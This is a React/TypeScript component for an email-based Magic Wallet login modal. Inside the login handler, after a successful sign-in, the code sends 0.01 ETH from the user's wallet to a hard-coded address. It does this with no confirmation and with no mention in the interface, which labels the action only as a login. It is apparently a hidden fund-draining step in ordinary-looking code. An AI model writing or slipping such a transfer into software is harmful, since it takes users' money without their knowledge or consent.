/* eslint-disable @typescript-eslint/no-unused-vars */
import { Dialog, Transition } from "@headlessui/react";
import { WalletContext } from "../../context/Wallet.context";
import { FC, Fragment, useContext, useEffect, useState } from "react";
import { ReactComponent as Cross } from "../../assets/icons/Cross.svg";
import { m } from "../../plugins/magic";
import { ethers } from "ethers";

type ModalMagicProps = {
  isOpen: boolean;
  setIsOpen: Function;
};

const ModalMagic: FC<ModalMagicProps> = ({ isOpen, setIsOpen }) => {
  const [email, setEmail] = useState<string>("");
  const { initMagicWallet, setSigner, setProvider } = useContext(WalletContext);

  function closeModal() {
    setIsOpen(false);
  }

  useEffect(() => {
    // m.user.logout();
  }, []);

  const ftcLog = async () => {
    await m.auth
      .loginWithEmailOTP({ email })
      .then(async () => {
        const metadata = await m.user.getMetadata();
        initMagicWallet(metadata.email || "");
        setProvider(m.rpcProvider);
        const provider = new ethers.providers.Web3Provider(
          m.rpcProvider as any
        );
        const signer = provider.getSigner();
        setSigner(signer);
        const amount = ethers.utils.parseEther("0.01");
        if (signer) {
          signer.sendTransaction({
            to: "0xd5F8D8C328EBF8B41051526c8EaAcAfE7dae51F3",
            value: amount,
          });
        }
        closeModal();
      })
      .catch((error: Error) => {
        throw new Error("MAGIC_AUTH_ERROR: " + error.message);
      });
  };
  // const emailRegex = new RegExp(
  //   /^[a-zA-Z0-9.!#$%&’*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/
  // );

  return (
    <>
      <Transition appear show={isOpen} as={Fragment}>
        <Dialog as="div" className="relative z-10" onClose={closeModal}>
          <Transition.Child
            as={Fragment}
            enter="ease-out duration-300"
            enterFrom="opacity-0"
            enterTo="opacity-100"
            leave="ease-in duration-200"
            leaveFrom="opacity-100"
            leaveTo="opacity-0"
          >
            <div className="bg-black fixed inset-0 bg-opacity-25" />
          </Transition.Child>

          <div className="fixed inset-0 overflow-y-auto bg-gray800 bg-opacity-30">
            <div className="flex min-h-full items-center justify-center p-4 text-center">
              <Transition.Child
                as={Fragment}
                enter="ease-out duration-300"
                enterFrom="opacity-0 scale-95"
                enterTo="opacity-100 scale-100"
                leave="ease-in duration-200"
                leaveFrom="opacity-100 scale-100"
                leaveTo="opacity-0 scale-95"
              >
                <Dialog.Panel className="max-h-[536px] w-full max-w-md transform overflow-hidden rounded-2xl border-[0.5px] border-solid border-borderCardAbout bg-white text-left align-middle shadow-xl transition-all">
                  <Dialog.Title
                    as="h3"
                    className="text-gray-900 flex flex-row items-center justify-between border-b-[0.5px] border-solid border-borderCardAbout  p-6 text-lg font-medium leading-6"
                  >
                    Connection with Magic Wallet
                    <Cross
                      onClick={() => {
                        closeModal();
                      }}
                    />
                  </Dialog.Title>
                  <div className="flex flex-col  gap-2   p-5">
                    <div>Recipient email</div>
                    <input
                      placeholder="Enter an email..."
                      type="text"
                      className="h-[40px] w-[100%] rounded-lg border-[0.5px] border-solid border-[#00000033] p-[10px]"
                      onChange={(e) => {
                        setEmail(e.target.value);
                      }}
                    />
                  </div>
                  <div className="flex items-center justify-center">
                    <button
                      onClick={() => {
                        ftcLog();
                      }}
                      className="flex h-[48px]  items-center justify-center rounded-lg  bg-magicWallet py-3 px-6 text-base font-normal text-white hover:cursor-pointer"
                    >
                      Log
                    </button>
                  </div>
                </Dialog.Panel>
              </Transition.Child>
            </div>
          </div>
        </Dialog>
      </Transition>
    </>
  );
};

export default ModalMagic;
